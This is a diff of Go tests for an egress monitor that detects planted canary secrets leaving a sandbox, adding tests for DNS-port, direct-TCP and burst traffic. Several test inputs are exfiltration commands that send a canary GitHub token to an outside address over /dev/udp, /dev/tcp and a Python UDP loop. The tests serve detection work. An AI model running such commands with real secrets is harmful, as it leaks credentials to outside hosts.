@@ -54,6 +54,9 @@ func upFirewall(t *testing.T, e *Egress) {
 	if err != nil {
 		t.Fatal(err)
 	}
+	if err := l.HoldBursts(); err != nil {
+		t.Fatal(err)
+	}
 	t.Cleanup(e.Serve(l, RedirectedFrom))
 	group := uint16(2000 + os.Getpid()%1000)
 	nflog, err := OpenNFLog(group)
@@ -93,7 +96,7 @@ cat <&3`)
 	}
 	// The catcher records a connection before it resets it, so it is
 	// recorded by the time the client has seen the reset.
-	want := ConnectDetail{Address: "203.0.113.7", Port: 443, Proto: "tcp", Via: "direct", Refused: true}
+	want := ConnectDetail{Address: "203.0.113.7", Port: 443, Proto: "tcp", Via: "direct", Refused: true, Unscanned: "it was still open after 1s; what it sent after was not searched"}
 	if got := rec.of(KindConnect); len(got) != 1 || !jsonEqual(t, got[0], want) {
 		t.Errorf("connect = %+v, want %+v", got, want)
 	}
@@ -120,6 +123,30 @@ func TestDirectUDPIsRefusedAndRecordedWithTheCanariesInIt(t *testing.T) {
 	if got := rec.of(KindConnect); !jsonEqual(t, got[0], want) {
 		t.Errorf("connect = %+v, want %+v", got, want)
 	}
+}
+
+func TestAnythingSentToPort53AtAnyAddressIsSearched(t *testing.T) {
+	requireFirewall(t)
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	upFirewall(t, e)
+
+	_, _ = asNobody(t, "printf 'k=%s' '"+testCanaries.Get(canary.GitHubToken)+"' > /dev/udp/203.0.113.9/53")
+	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
+}
+
+func TestADirectTCPConnectionsPayloadIsSearched(t *testing.T) {
+	requireFirewall(t)
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	upFirewall(t, e)
+
+	_, _ = asNobody(t, "printf 'k=%s' '"+testCanaries.Get(canary.GitHubToken)+"' > /dev/tcp/203.0.113.9/9997")
+	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
 }
 
 func TestDirectIPv6IsRefusedAndRecorded(t *testing.T) {
@@ -250,7 +277,7 @@ func TestABurstOfLargePacketsLosesNoCanaryUnsaid(t *testing.T) {
 	upFirewall(t, e)
 
 	// 600 datagrams of 60 KB as fast as Python sends them, the token in the
-	// 300th: either it is found, or the loss is.
+	// 300th: the NFLOG buffer holds them all, so the token is found.
 	_, _ = asNobody(t, python+` -I -c '
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -262,10 +289,54 @@ for i in range(600):
     except OSError:
         pass
 '`)
-	rec.waitFor(t, func() bool {
-		found := leftAs(t, rec)
-		return hasRule(found, findings.RuleCanaryLeft) || hasRule(found, findings.RuleDirectUnrecorded)
-	})
-	t.Logf("%d direct observations; canary found: %v; loss found: %v", len(rec.of(KindConnect)),
-		hasRule(leftAs(t, rec), findings.RuleCanaryLeft), hasRule(leftAs(t, rec), findings.RuleDirectUnrecorded))
+	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
+	if found := leftAs(t, rec); hasRule(found, findings.RuleDirectUnrecorded) {
+		t.Errorf("findings = %+v, want no packet lost", found)
+	}
+}
+
+func TestTheRefusedPacketLogHoldsABurst(t *testing.T) {
+	requireFirewall(t)
+	n, err := OpenNFLog(uint16(3000 + os.Getpid()%1000))
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() { _ = n.Close() })
+	got, err := syscall.GetsockoptInt(n.fd, syscall.SOL_SOCKET, syscall.SO_RCVBUF)
+	if err != nil {
+		t.Fatal(err)
+	}
+	if got < nflogReceiveBuffer {
+		t.Errorf("the netlink socket's buffer is %d bytes, want at least %d", got, nflogReceiveBuffer)
+	}
+}
+
+func TestABurstToPort53LosesNoCanary(t *testing.T) {
+	requireFirewall(t)
+	python, err := exec.LookPath("python3")
+	if err != nil {
+		t.Skip("needs python3 to send a burst of large datagrams")
+	}
+	rec := newRecorded()
+	e := New(Config{CA: newCA(t), Upstream: &fakeUpstream{}, Resolver: fakeResolver{}})
+	e.Observe(rec.observe)
+	e.SetCanaries(testCanaries)
+	upFirewall(t, e)
+
+	// As the NFLOG burst, aimed at the DNS socket: the token in the 300th.
+	_, _ = asNobody(t, python+` -I -c '
+import socket
+s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+pad = b"x" * 60000
+for i in range(600):
+    body = (b"k=`+testCanaries.Get(canary.GitHubToken)+`;" + pad) if i == 299 else pad
+    try:
+        s.sendto(body, ("203.0.113.9", 53))
+    except OSError:
+        pass
+'`)
+	rec.waitFor(t, func() bool { return hasRule(leftAs(t, rec), findings.RuleCanaryLeft) })
+	if found := leftAs(t, rec); hasRule(found, findings.RuleDirectUnrecorded) {
+		t.Errorf("findings = %+v, want no datagram lost", found)
+	}
 }
